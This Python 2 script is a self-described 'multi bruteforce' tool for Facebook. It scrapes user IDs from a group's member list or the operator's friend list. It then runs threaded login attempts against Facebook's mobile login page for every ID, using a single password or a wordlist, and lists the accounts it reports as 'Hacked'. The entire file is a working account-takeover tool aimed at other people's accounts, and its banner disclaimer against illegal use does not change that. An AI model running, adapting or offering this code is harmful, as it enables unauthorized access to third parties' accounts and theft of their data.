from __future__ import print_function
import platform,os
def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('\rm[!] Please use python version 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm[!]SepertiNya Module \rcmechanize\rm not yet install...')
	os.sys.exit()
def Exit():
	simpan()
	tampil('\rm[!]Exit')
	os.sys.exit()
log = 0
id_friend = []
id_bgroup = []
fid_friend = []
fid_bgroup = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_friend
	try:
		fid_bgroup = open(os.sys.path[0]+'/MBFbgroup.txt','r').readlines()
	except:pass
	try:
		fid_friend = open(os.sys.path[0]+'/MBFfriend.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('\n\rm[!]Cancelled')
			Exit()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm[!]Enter the options ...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Enter correctly')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('\rm[!]Options do not exist')
			continue
		if i in d:
			break
		else:
			tampil('\rm[!]Options do not exist')
	return i
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Save results of group in')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!] Successful to save in \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]Failed to save')
	if len(id_friend) != 0:
		tampil('\rh[*]Save the Friend list in...')
		try:
			open(os.sys.path[0]+'/MBFfriend.txt','w').write('\n'.join(id_friend))
			tampil('\rh[!]Save successfully \rcMBFfriend.txt')
		except:
			tampil('\rm[!]Failed to save')
def open(d):
	tampil('\rh[*] Opening \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm[!]Unable to open \rp'+d)
		Exit()
	if '<link rel="redirect" href="' in x:
		return open(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?]Email/HP')
	pa = inputD('[?]Password')
	tampil('\rh[*]login in....')
	open('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rh[*]Login Successful')
		open('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh[*] Welcome \rk%s\n\rh[*]Hope This is your Lucky Day'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
		Exit()
	else:
		tampil('\rm[!]Login Failed')
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_friend.append(i)
		tampil('\rc==>\rb%s\rm'%i)
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		if i.find('profile.php') == -1:
			a = i.replace('?','')
		else:
			a = i.replace('profile.php?id=','').replace('&amp;','')
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a)
			id_bgroup.append(a)
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Group')
		tampil('\rh[*]Check Group....')
		a = open('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
			break
		except:
			tampil('\rm[!]The ID you entered is incorrect')
			continue
	tampil('\rh[*]Retrieves Id from group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*]Login First...')
		login()
		if log == 0:
			Exit()
	next = saring_id_group0()
	while 1:
		saring_id_group1(open(next))
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
		except:
			tampil('\rm[!]aThe id are \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Direct Crack (y/n)',['Y','N'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def idteman():
	if log != 1:
		tampil('\rh[*]Login First...')
		login()
		if log == 0:
			Exit()
	saring_id_teman(open('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex= 'friends_center_main').url
	except:
		if len(id_teman) != 0:
			tampil('\rm[!]There id are  \rp%d id'%len(id_friend))
		else:
			tampil('\rm[!]Cancelled')
			Exit()
	while 1:
		saring_id_teman(open(next))
		try:
			next = br.find_link(url_regex= 'friends_center_main').url
		except:
			tampil('\rm[!]There id are \rp%d id'%len(id_friend))
			break
	simpan()
	i = inputD('[?]Directly Crack (y/n)',['Y','N'])
	if i.upper() == 'Y':
		return crack(id_friend)
	else:
		return menu()
class mt(threading.Thread):
    def __init__(self,i,p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 3
        self.p = p
    def update(self):
        return self.a,self.id
    def run(self):
        try:
             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
        except KeyboardInterrupt:
            os.sys.exit()
        except:
            self.a = 8
            os.sys.exit()
        if 'm_sess' in data.url or 'save-device' in data.url:
            self.a = 1
        elif 'checkpoint' in data.url:
            self.a = 2
        else:
            self.a = 0
def crack(d):
	i = inputD('[?]Take Password list/Manual (l/m)',['L','M'])
	if i.upper() == 'L':
		while 1:
			dir = inputD('[?]Enter address file')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil('\rm[!]Unable to open \rk%s'%dir)
				continue
			break
		tampil('\rh[*]Start cracking with \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Not Satisfied with Results, Want to try again(y/n)',['Y','N'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD('[?]Password'),1)
def crack0(data,sandi,p):
	tampil('\rh[*]Cracking \rk%d Account \rhwith passwords \rm[\rk%s\rm]'%(len(data),sandi))
	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		if len(i) != 0:th.append(mt(i,sandi))
	for i in th:
		jml1 += 1
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in akun_jml:
					jml0 += 1
					if a[0] == 2:
						akun_cekpoint.append(a[1])
					elif a[0] == 1:
						akun_sukses.append(a[1])
					elif a[0] == 0:
						akun_gagal.append(a[1])
					elif a[0] == 8:
						akun_error.append(a[1])
					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			Exit()
	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rh[*]Hacked')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*] Number of Hacked Accounts\rp      %d'%len(akun_sukses))
	tampil('\rm[*]Number of failed Accounts\rp           %d'%len(akun_gagal))
	tampil('\rk[*]Number of Verification Account\rp  %d'%len(akun_cekpoint))
	tampil('\rc[*]Number of Accounts error\rp           %d'%len(akun_error))
	if p:
		i = inputD('[?]You wanna try again(y/n)',['Y','N'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
	else:
		return 0
def lanjutT():
	global fid_friend
	if len(fid_friend) != 0:
		i = inputD('[?]Research Friend ID Results / continue (r/c)',['R','C'])
		if i.upper() == 'C':
			return crack(fid_friend)
		else:
			os.remove(os.sys.path[0]+'/MBFfriend.txt')
			fid_friend = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Research the Id Group result/continue (r/c)',['R','C'])
		if i.upper() == 'C':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/MBFbgroup.txt')
			fid_bgroup = []
	return 0
def menu():
	tampil('''\rh
                     .-.-..
                    /+/++//
                   /+/++//
            \rk*   *\rh /+/++//
             \ /  |/__//
           {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
             [']  /'|'\           \\
                 /  \  \           '
                 \_  \_ \_    \rk*\rhDragonFly ZomBie
\rk###########################################################
#             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                    #
# \rhBY\rp                                        NICOLEUS F SITORUS        \rk#
# \rhGitHub\rp                  https://github.com/nicoleus        \rk#
# \rhUploaded & translated by         NICOLEUS F SITORUS               \rk#
# \rhGitHub\rp                  https://github.com/nicoleus          \rk#
#       \rmDo Not Use This Tool For IllegaL Purpose             \rk#
###########################################################''')
	tampil('''\rk%s\n\rc1 \rh Take ID of group\n\rc2 \rhTake ID from friend list \n\rc3 \rmExit\n\rk%s'''%('#'*20,'#'*20))
	i = inputM('[?]Choose',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
		lanjutT()
		idteman()
	elif i == 3:
		Exit()
bacaData()
menu()
